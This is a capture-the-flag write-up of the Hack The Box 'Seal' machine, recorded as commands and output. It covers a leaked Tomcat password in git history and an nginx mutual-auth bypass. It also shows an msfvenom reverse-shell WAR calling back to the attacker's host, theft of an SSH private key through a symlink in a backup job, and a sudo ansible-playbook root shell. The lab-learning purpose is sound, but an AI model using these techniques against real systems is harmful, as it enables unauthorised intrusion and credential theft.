#### port scan
`└─$ sudo nmap -p- -sSCV 10.10.10.250 --min-rate 999`
```
PORT     STATE SERVICE    VERSION
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
443/tcp  open  tcpwrapped
| tls-nextprotoneg: 
|_  http/1.1

| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  tcpwrapped
```
#### web app enum
port 8080, is a gitbucket app, register a user, we can view all the codes
also view the history comments, get a credential
> http://seal.htb:8080/root/seal_market/blob/ac210325afd2f6ae17cce84a8aa42805ce5fd010/tomcat/tomcat-users.xml
```
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
</tomcat-users>
```
the config of tomcat indicates mutual auth validation is required, if true, will direct to port 8000, where tomcat is really listening
> http://seal.htb:8080/root/seal_market/blob/ac210325afd2f6ae17cce84a8aa42805ce5fd010/nginx/sites-enabled/default
```
	location /manager/html {
		if ($ssl_client_verify != SUCCESS) {
			return 403;
		}
		proxy_set_header        Host $host;
		proxy_set_header        X-Real-IP $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header        X-Forwarded-Proto $scheme;
		proxy_pass          http://localhost:8000;
		proxy_read_timeout  90;
		proxy_redirect      http://localhost:8000 https://0.0.0.0;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
#		try_files $uri $uri/ =404;
	}
 
        location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                        return 403;
```
Googling of mutual auth bypass
> https://rioasmara.com/2022/03/21/nginx-and-tomcat-mutual-auth-bypass/

If access manager page directly:
> https://seal.htb/manager/html
> 403 Forbidden

try the bypass methid
> https://seal.htb/manager;name=admin/html login page
For some reason, I am only able to deploy war file by using Burp S.

#### foothold
After enter tomcat manager page, deploy a reverse war file
`└─$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.7 lport=8821 -f war > r.war`
```
Payload size: 1100 bytes
Final size of war file: 1100 bytes
```
visit https://seal.htb/r/
```
└─$ nc -nvlp 8821                             
listening on [any] 8821 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.250] 52402
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
python3 -c "import pty;pty.spawn('/bin/bash')"
```
#### lateral move
execute linpeas:
```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/opt/backups/archives/backup-2026-01-02-16:45:34.gz
/tmp/hsperfdata_tomcat/1113
```
check backup folder
```
drwxr-xr-x 4 luis luis 4096 Jan  2 16:45 /opt/backups
total 8
drwxrwxr-x 2 luis luis 4096 Jan  2 16:45 archives
drwxrwxr-x 2 luis luis 4096 May  7  2021 playbook
```
under playbook dir
```
-rw-rw-r-- 1 luis luis  403 May  7  2021 run.yml
tomcat@seal:/opt/backups$ cat playbook/run.yml
cat playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

copy_links=yes
```
This option means symbolic links will be followed and the actual files they point to will be copied, rather than just the symlink itself.

chech of achived files
```
$ ls -l
total 2368
-rw-rw-r-- 1 luis luis 606047 Jan  3 16:10 backup-2026-01-03-16:10:32.gz
-rw-rw-r-- 1 luis luis 606047 Jan  3 16:11 backup-2026-01-03-16:11:31.gz
-rw-rw-r-- 1 luis luis 606047 Jan  3 16:12 backup-2026-01-03-16:12:32.gz
-rw-rw-r-- 1 luis luis 606047 Jan  3 16:13 backup-2026-01-03-16:13:31.gz
```
this playbook ran each minute
```
$ ls -l /home/lius/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
total 92
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6  2021 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 May  7  2021 uploads
```
we have full privi to uploads dir, but only have read privi to ru.yml,luis and root have privi to execute this script.
link lius home folder first.
```
ls -l run.yml
-rw-rw-r-- 1 luis luis 403 May  7  2021 run.yml
```
`ln -s /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads /home/luis`
check anything new on arvhice dir
`$ cd /opt/backups/archives `
```
$ ls -la
total 115268
drwxrwxr-x 2 luis luis      4096 Jan  3 16:34 .
drwxr-xr-x 4 luis luis      4096 Jan  3 16:34 ..
-rw-rw-r-- 1 luis luis    606064 Jan  3 16:30 backup-2026-01-03-16:30:32.gz
-rw-rw-r-- 1 luis luis    606064 Jan  3 16:31 backup-2026-01-03-16:31:32.gz
-rw-rw-r-- 1 luis luis    606064 Jan  3 16:32 backup-2026-01-03-16:32:32.gz
-rw-rw-r-- 1 luis luis    606064 Jan  3 16:33 backup-2026-01-03-16:33:32.gz
-rw-rw-r-- 1 luis luis 115598840 Jan  3 16:34 backup-2026-01-03-16:34:31.gz
```
`tomcat@seal:/opt/backups/archives$ cp backup-2026-01-03-15:55:31.gz /tmp/bak`
seems a gunzip file, but if unzip it may encounter errors

`tar zxf backup-2021-09-04-07\:59\:32.gz --force-local`
```
tomcat@seal:/tmp/bak/dashboard$ ls
ls
bootstrap  css  images  index.html  scripts  uploads
```
get the files under ~/ of luis
```
$ cd uploads
$ ls
luis
$ cd luis
$ ls
gitbucket.war
user.txt
```

`$ ls -la`
```
total 51320
drwxr-x--- 9 tomcat tomcat     4096 May  7  2021 .
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 ..
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 .ansible
-rw-r----- 1 tomcat tomcat      220 May  5  2021 .bash_logout
-rw-r----- 1 tomcat tomcat     3797 May  5  2021 .bashrc
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 .cache
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 .config
drwxr-x--- 6 tomcat tomcat     4096 Jan  3 16:38 .gitbucket
-rw-r----- 1 tomcat tomcat 52497951 Jan 14  2021 gitbucket.war
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 .java
drwxr-x--- 3 tomcat tomcat     4096 Jan  3 16:38 .local
-rw-r----- 1 tomcat tomcat      807 May  5  2021 .profile
drwx------ 2 tomcat tomcat     4096 Jan  3 16:38 .ssh
-r-------- 1 tomcat tomcat       33 Jan  2 14:37 user.txt
```
cp privi key to ssh as luis
`$ ls .ssh`
```
authorized_keys
id_rsa
id_rsa.pub

total 12
-rw-r----- 1 tomcat tomcat  563 May  7  2021 authorized_keys
-rw------- 1 tomcat tomcat 2590 May  7  2021 id_rsa
-rw-r----- 1 tomcat tomcat  563 May  7  2021 id_rsa.pub
```
check if pub key matches authorized_keys
```
$ md5sum authorized_keys id_rsa.pub
a03275942de46b5d0de68dfa7ef99e2a  authorized_keys
a03275942de46b5d0de68dfa7ef99e2a  id_rsa.pub
```

cp the privi key to kali, ssh as luis
```
─$ ssh -i /tmp/id_rsa lius@10.10.10.250
luis@seal:~$ id
uid=1000(luis) gid=1000(luis) groups=1000(luis)
```
#### escalate privi
`luis@seal:~$ sudo -l`
```
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
luis@seal:~$ ls -la /usr/bin/ansible-playbook 
lrwxrwxrwx 1 root root 7 Mar 16  2020 /usr/bin/ansible-playbook -> ansible
```

`luis@seal:~$ ls -la /usr/bin/ansible-playbook `
```
lrwxrwxrwx 1 root root 7 Mar 16  2020 /usr/bin/ansible-playbook -> ansible

luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'
```
```
PLAY [localhost] ************************************************************************************************************

TASK [Gathering Facts] ******************************************************************************************************
ok: [localhost]

TASK [shell] ****************************************************************************************************************
#id
uid=0(root) gid=0(root) groups=0(root)
```
#### lesson learned
- search for config and hardcoded passw and credentials in config files or hisory comments for web enum
- tomcat or nginx sites-enables are critical, get the info of web listening
- symbolic link, ln -s
- match of pub key and authorized_keys
